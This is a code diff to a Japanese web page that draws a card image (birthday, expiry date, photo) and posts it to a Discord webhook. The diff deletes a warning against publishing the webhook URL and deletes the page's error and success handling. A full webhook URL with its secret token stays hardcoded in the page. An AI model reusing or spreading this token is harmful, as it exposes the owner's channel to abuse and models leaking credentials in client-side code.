@@ -37,13 +37,11 @@ input, select, button { width: 260px; margin-bottom: 10px; }
     <input type="file" id="photo" accept="image/*">
 
     <button id="sendBtn">Discordに送信</button>
-    <div class="small">※Webhook URLを公開しないでください（第三者に悪用されます）</div>
   </div>
 
 </div>
 
 <script>
-/** ★ 自分のWebhookに差し替え ★ */
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1467433717969584231/m-MnTavprILs6PC2iK_NMZFRyPG0-rmBlf0y5B4WrJI0gYoHjyJqtg_Y0TVMvCJYpTzU";
 
 const canvas = document.getElementById("cardCanvas");
@@ -110,7 +108,6 @@ document.getElementById("sendBtn").addEventListener("click", async () => {
   const birthday = values[3].value || "-";
   const expiry = values[4].value || "-";
 
-  try {
     // ① 画像（合成済みCanvas）をPNGに
     const pngBlob = await canvasToBlob(canvas, "image/png");
 
@@ -140,16 +137,6 @@ document.getElementById("sendBtn").addEventListener("click", async () => {
       body: formData
     });
 
-    if (res.ok) {
-      alert("Discordに送信しました！");
-    } else {
-      const text = await res.text().catch(() => "");
-      alert("送信に失敗しました。\n" + res.status + " " + res.statusText + "\n" + text);
-    }
-
-  } catch (e) {
-    alert("通信エラー：\n" + (e?.message || e));
-  }
 });
 
 // 初期描画
